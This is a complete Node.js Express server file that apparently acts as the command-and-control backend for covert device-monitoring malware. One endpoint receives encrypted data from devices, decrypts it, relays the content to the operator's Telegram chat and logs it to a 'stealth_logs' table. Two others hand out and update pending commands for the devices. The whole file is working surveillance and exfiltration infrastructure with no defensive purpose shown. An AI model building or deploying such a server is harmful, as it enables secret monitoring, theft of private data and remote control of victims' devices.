const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const TelegramBot = require('node-telegram-bot-api');
const { decryptHybridData } = require('./utils/decryptor');
require('dotenv').config();

const app = express();
app.use(express.json());

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const MY_CHAT_ID = process.env.MY_CHAT_ID;
const PRIVATE_KEY_PEM = process.env.PRIVATE_KEY.replace(/\\n/g, '\n');

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

app.post('/api/v1/sync', async (req, res) => {
    try {
        const { device_id, event_type, event_data } = req.body;
        const { encrypted_key, encrypted_data } = event_data;

        const decrypted = decryptHybridData(PRIVATE_KEY_PEM, encrypted_key, encrypted_data);

        if (decrypted) {
            const msg = `🔔 *New Alert*\n📱 Device: \`${device_id}\`\n🔍 Type: \`${event_type}\`\n📝 Content:\n\`\`\`\n${decrypted}\n\`\`\``;
            bot.sendMessage(MY_CHAT_ID, msg, { parse_mode: 'Markdown' });

            await supabase.from('stealth_logs').insert([req.body]);

            res.status(200).json({ status: 'success' });
        } else {
            res.status(400).json({ error: 'decryption_failed' });
        }
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'internal_error' });
    }
});

app.get('/api/v1/commands', async (req, res) => {
    try {
        const { data, error } = await supabase
            .from('commands')
            .select('command')
            .eq('status', 'pending')
            .limit(1);
        
        if (error) return res.status(500).json(error);
        res.status(200).json(data);
    } catch (err) {
        res.status(500).json({ error: 'internal_error' });
    }
});

app.patch('/api/v1/commands/update', async (req, res) => {
    try {
        const { status } = req.body;
        const { error } = await supabase
            .from('commands')
            .update({ status: status })
            .eq('status', 'pending');
        
        if (error) return res.status(500).json(error);
        res.status(200).json({ status: 'updated' });
    } catch (err) {
        res.status(500).json({ error: 'internal_error' });
    }
});

app.listen(3000, () => console.log('✅ Proxy Server running on port 3000'));
